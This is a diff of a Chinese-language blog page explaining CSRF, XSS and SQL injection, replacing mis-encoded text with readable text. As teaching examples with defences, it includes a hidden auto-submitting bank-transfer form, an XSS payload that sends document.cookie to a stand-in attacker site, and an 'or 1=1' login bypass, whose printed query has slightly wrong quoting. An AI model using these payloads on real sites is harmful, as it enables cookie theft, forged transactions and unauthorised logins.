@@ -141,6 +141,8 @@
                 <div class="post-heading">
                     <div class="tags">
                         
+                          <a class="tag" href="/tags/#Web安全" title="Web安全">Web安全</a>
+                        
                     </div>
                     <h1>常见的几种前端安全问题及其原理解析</h1>
                     <h2 class="subheading"></h2>
@@ -165,62 +167,62 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <p>��Ȼ�ںܶ�������ǰ�˹���ʦ����ддҳ��дд�����߼���Ȼ������ӿڰ�������Ⱦ��ȥ�������ˣ��������簲ȫʲô�����ⶼ�����ְλ��ȫ�޹ء�������ʵ��Ϊÿ���������û���ֱ�ӽӴ�����ǰ��ҳ����˵��ǰ�����������簲ȫ����©���������������ܴ󲿷�©������Ҫ������޸����������˵��������webǰ�˰�ȫ���⣺</p>
+                <p>虽然在很多人眼里前端工程师就是写写页面写写交互逻辑，然后调调接口把数据渲染上去就完事了，至于网络安全什么的问题都跟这个职位完全无关。但是其实作为每个互联网用户最直接接触到的前端页面来说，前端往往是网络安全发生漏洞的重灾区（尽管大部分漏洞都需要后端来修复），下面就说几个常见web前端安全问题：</p>
 <ol>
-<li>CSRF��cross site request forgery����վ����α�죩</li>
-<li>XSS��cross site script����վ�����ű���</li>
-<li>SQLע��</li>
+<li>CSRF（cross site request forgery：跨站请求伪造）</li>
+<li>XSS（cross site script：跨站攻击脚本）</li>
+<li>SQL注入</li>
 </ol>
 <hr>
-<h3 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="# 1.CSRF"></a># 1.CSRF</h3><p>CSRF���ǿ�վ����α�죬�������������û���cookie���Լ�α��ɺϷ��û��Ӷ���Ŀ����վ���������������ͨ��һ��ͼ�����������ԭ��</p>
+<h3 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="# 1.CSRF"></a># 1.CSRF</h3><p>CSRF就是跨站请求伪造，即攻击者利用用户的cookie将自己伪造成合法用户从而对目标网站发起恶意请求。我们通过一张图来看下其基本原理</p>
 <html>
 <img src="https://mmbiz.qpic.cn/mmbiz_png/WlIksv5EUJk6BjIveOWTsAZiceJOxCziaoLcTGYPvwb0WCZiaA9hiaYz3y4co4fnJR7czrJmGJTaUZqzbj6eFmzYOQ/640?wx_fmt=png"/>
 </html>
 
-<p>CSRF������Ҫ�������¼���������<br>1.Ŀ����վAʹ��cookie����֤�û�����<br>2.�û���¼��Ŀ����վA����cookie����Ӳ���У�<br>3.�û�û�еǳ���Ŀ����վA</p>
-<p>���������ϼ��������������������忴��CSRF�ľ�����̣�<br/><br>�������û���¼��Ŀ����վA������1������վA�ķ�����������Cookie���û���ʹ���û����ݱ���֤������2����Ȼ���û���С�ķ����˹����ߵĶ�����վB������3������ʱ����վB�Ϲ�����ͨ��ĳ���ֶ�ʹ���û��ڲ�֪�������´���ԭ�ȵ�cookie�����˶�Ŀ����վA�Ķ������󣨲���4������վA���յ�֮�����cookie����Ϊ���û����������������Ӧ���Ӷ�ʹ�����ߴﵽĿ��</p>
-<p>һ�㲽��4����ƭ�ֶ����£�</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 1.Ʃ������վ�ڵ�ͼƬ��Դ��Ǳ������ת�˲���</span><br><span class="line">&lt;img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width=&apos;0&apos; height=&apos;0&apos;&gt;</span><br><span class="line"></span><br><span class="line">// 2.������������ر�������ͨ���ű��ύ��������</span><br><span class="line">&lt;iframe style=&quot;display: none;&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;form method=&apos;POST&apos; action=&apos;http://www.bank.example/transfer&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;toBankId&apos; value=&apos;hello&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;amount&apos; value=&apos;1000000&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>���û��򿪶�����վ����Щ������վ�Ľű��ͻ�ִ�У��Ӷ�ʹ�û��ڲ�֪�������·�������</p>
-<p>���Կ���������CSRF��ʵ���õĶ����û����Է���Ϊ������ǰ�˻���û��ʲô�취������ֻ�ܿ���˶�����������<br>1.ͨ�����������referer�ֶΣ�referer�ֶα�ʾ�����û�ͨ���ĸ���վ����վ�������󣬵������������������������ܹ���ȷ����referer�ֶΣ������ͨ��������ô��������򲻿ɿ���<br>2.ͨ���������ַ�м�token����֤<br>3.�û����������ȫ��ʶ��������ʶ�����վ</p>
+<p>CSRF攻击需要满足以下几个条件：<br>1.目标网站A使用cookie来验证用户身份<br>2.用户登录过目标网站A（即cookie存在硬盘中）<br>3.用户没有登出过目标网站A</p>
+<p>满足了以上几个条件，我们再来具体看看CSRF的具体过程：<br/><br>首先是用户登录了目标网站A（步骤1），网站A的服务器发送了Cookie给用户，使得用户身份被验证（步骤2）。然后用户不小心访问了攻击者的恶意网站B（步骤3），此时在网站B上攻击者通过某种手段使得用户在不知情的情况下带着原先的cookie发起了对目标网站A的恶意请求（步骤4），网站A接收到之后检验cookie误以为是用户发起的请求并做出回应，从而使攻击者达到目的</p>
+<p>一般步骤4的欺骗手段如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 1.譬如在网站内的图片资源中潜入恶意的转账操作</span><br><span class="line">&lt;img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width=&apos;0&apos; height=&apos;0&apos;&gt;</span><br><span class="line"></span><br><span class="line">// 2.构建恶意的隐藏表单，并通过脚本提交恶意请求</span><br><span class="line">&lt;iframe style=&quot;display: none;&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;form method=&apos;POST&apos; action=&apos;http://www.bank.example/transfer&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;toBankId&apos; value=&apos;hello&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;amount&apos; value=&apos;1000000&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>当用户打开恶意网站，这些恶意网站的脚本就会执行，从而使用户在不知情的情况下发起请求</p>
+<p>可以看出，整个CSRF其实利用的都是用户的自发行为，所以前端基本没有什么办法防御，只能靠后端对请求进行甄别：<br>1.通过检验请求的referer字段：referer字段表示的是用户通过哪个网站对网站发起请求，但是这个方法依赖的是浏览器能够正确发送referer字段，如果是通过代理那么这个方法则不可靠了<br>2.通过在请求地址中加token并验证<br>3.用户提高自身安全意识，避免访问恶意网站</p>
 <hr>
-<h3 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h3><p>XSS����վ�ű�����������ͨ����������ҳ��ע���ִ�ж���js�ű���Ȼ��Է��ʸ�ҳ����û����𹥻����ֶ�</p>
-<p>��վ�ű����Է�Ϊ���֣�</p>
+<h3 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h3><p>XSS即跨站脚本，即攻击者通过将服务器页面注入可执行恶意js脚本，然后对访问该页面的用户发起攻击的手段</p>
+<p>跨站脚本可以分为多种：</p>
 <html>
 <img src="https://mmbiz.qpic.cn/mmbiz_png/WlIksv5EUJk6BjIveOWTsAZiceJOxCziaoJicR9nAsCzqwbPG68NxDFK5chtkczH3oVwx0YTX7dTx6MpCIMbibIWuQ/640?wx_fmt=png"/>
 </html>
 
-<h4 id="cookie�ٳ�"><a href="#cookie�ٳ�" class="headerlink" title="cookie�ٳ�"></a>cookie�ٳ�</h4><p>����һ��ҳ���и����ۿ򣬵�����������ڸ�ҳ��ķ�����û�н������Ĺ��ˣ����¼����������Ҳ�ᱻ���浽���ݿ��У���ҳ�����ʱ�ͻ�����Ĵ��롣���£�<br/></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;form action=&quot;saveComment.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     �������������ݣ�&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;content&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;ȷ��&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-<p>��ʱ�����߷����������ۿ����������´��룺<br/></p>
+<h4 id="cookie劫持"><a href="#cookie劫持" class="headerlink" title="cookie劫持"></a>cookie劫持</h4><p>假如一个页面有个评论框，当你输入后，由于该页面的服务器没有进行明文过滤，导致加入输入代码也会被保存到数据库中，当页面访问时就会解析改代码。如下：<br/></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;form action=&quot;saveComment.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     请输入评论内容：&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;content&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;确认&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>此时攻击者分析后，在评论框里输入如下代码：<br/></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;http://www.attackpage.com/record?secret=&quot; + document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>��ô�������û�������������ʱ�����Ѿ������ˣ��û��������cookie�ͻᱻ���͵�<a href="http://www.attackpage.com��������ߵķ�������ȥ���������������������Щcookieð���û����в�����" target="_blank" rel="noopener">www.attackpage.com��������ߵķ�������ȥ���������������������Щcookieð���û����в�����</a></p>
-<h4 id="�Uα��"><a href="#�Uα��" class="headerlink" title="�Ựα��"></a>�Ựα��</h4><p>ͬ�������ۿ�Ϊ����ֻ������ʱ����������Ĳ�����һ���Լ��ķ�����������ֱ������һ������һ����վ���������£�<br/></p>
+<p>那么当其他用户看到这条评论时，就已经中招了，用户浏览器的cookie就会被发送到<a href="http://www.attackpage.com这个攻击者的服务器上去，而攻击者则可以利用这些cookie冒充用户进行操作了" target="_blank" rel="noopener">www.attackpage.com这个攻击者的服务器上去，而攻击者则可以利用这些cookie冒充用户进行操作了</a></p>
+<h4 id="会话伪造"><a href="#会话伪造" class="headerlink" title="会话伪造"></a>会话伪造</h4><p>同样以评论框为例，只不过此时攻击者输入的不再是一个自己的服务器，而是直接输入一个对另一个网站的请求，如下：<br/></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://www.bank.example/transfer?toBankId=hello&amp;amount=1000000 width=&apos;0&apos; height=&apos;0&apos;&gt;</span><br></pre></td></tr></table></figure>
-<p>���û�������������ʱ������û�֮ǰ��½��bank��վ����ô�ͻᱻ���������ã���bank����ת�����󣬴Ӷ����﹥����Ŀ��</p>
-<h4 id="�����������ִ��"><a href="#�����������ִ��" class="headerlink" title="�����������ִ��"></a>�����������ִ��</h4><ul>
-<li>Ʃ��������ʢ�е���ҳ��Ϸ�����ȡ�</li>
-<li>Ʃ��ɴ�ֱ�������ҳ�濨�������ԡ�</li>
-<li>Ʃ������ѭ����</li>
-<li>���Կ�����XSS�����ǱȽ������ģ���������Ҫ���з������ܽ��������ֶεĹ���������������Ҳ��������������˷�������ִ�У�</li>
+<p>当用户看到这条评论时，如果用户之前登陆过bank网站，那么就会被攻击者利用，对bank发起转账请求，从而到达攻击者目的</p>
+<h4 id="其他恶意代码执行"><a href="#其他恶意代码执行" class="headerlink" title="其他恶意代码执行"></a>其他恶意代码执行</h4><ul>
+<li>譬如市面上盛行的网页游戏弹窗等。</li>
+<li>譬如干脆直接让这个页面卡死都可以。</li>
+<li>譬如无限循环。</li>
+<li>可以看出，XSS攻击是比较主动的，攻击者需要进行分析才能进行这种手段的攻击。而防御方法也基本都是依靠后端服务器来执行：</li>
 </ul>
 <ol>
-<li>��ȫ������ǰ�˵����룬����������Ľ��й���</li>
-<li>cookie����Ϊhttp-only���������޷�ͨ���ű���ȡcookie��</li>
-<li>cookie�ŵ�����Ҫ��cookie�з����κ��漰��˽����Ϣ</li>
+<li>完全不信任前端的输入，对输入的明文进行过滤</li>
+<li>cookie设置为http-only，这样就无法通过脚本获取cookie了</li>
+<li>cookie放盗，不要在cookie中放入任何涉及隐私的信息</li>
 </ol>
 <hr>
-<h3 id="3-SQLע��"><a href="#3-SQLע��" class="headerlink" title="3.SQLע��"></a>3.SQLע��</h3><p>SQLע��������ú�̨�����������ݵĴ��������©�������̨����һЩ�ܹ�Ӱ���˴�����������ݣ���һ�������򵥵�����˵һ�£���Ȼ��ǰ�������Ǻ�˶�����û�й��ˣ���<br>ǰ����һ���������£�</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     �������û��������룺&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;name&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input name=&quot;password&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;��½&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3.SQL注入"></a>3.SQL注入</h3><p>SQL注入就是利用后台对于请求数据的处理代码的漏洞，向后台输入一些能够影响后端处理代码的数据，以一个最蠢最简单的例子说一下（当然，前提依旧是后端对数据没有过滤）：<br>前端有一个表单如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt; </span><br><span class="line">     请输入用户名与密码：&lt;BR&gt; </span><br><span class="line">     &lt;input name=&quot;name&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input name=&quot;password&quot; type=&quot;text&quot;&gt; </span><br><span class="line">     &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
 
-<p>����˶Ա������ύ���ݵĴ������£�</p>
+<p>而后端对表单的提交数据的处理如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;SELECT * FROM  users  WHERE name = &apos;&quot; + name + &quot;&apos; AND password = &apos;&quot; + password + &quot;&apos;&quot;;</span><br></pre></td></tr></table></figure>
 
-<p>����������ڱ������룺</p>
+<p>如果攻击者在表单输入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = &apos; or 1=1</span><br><span class="line">password=&apos;anything&apos;</span><br></pre></td></tr></table></figure>
-<p>��ô��˵Ĵ���������ǣ�</p>
+<p>那么后端的处理结果就是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM  users  WHERE name = &apos;&apos;&apos; or 1=1 AND password = &apos;anything&apos;;</span><br></pre></td></tr></table></figure>
-<p>��ô��ʱ�����߾Ϳ����ƿ���¼������¼����վ��</p>
+<p>那么此时攻击者就可以绕开登录名而登录该网站了</p>
 
 
                 <hr>
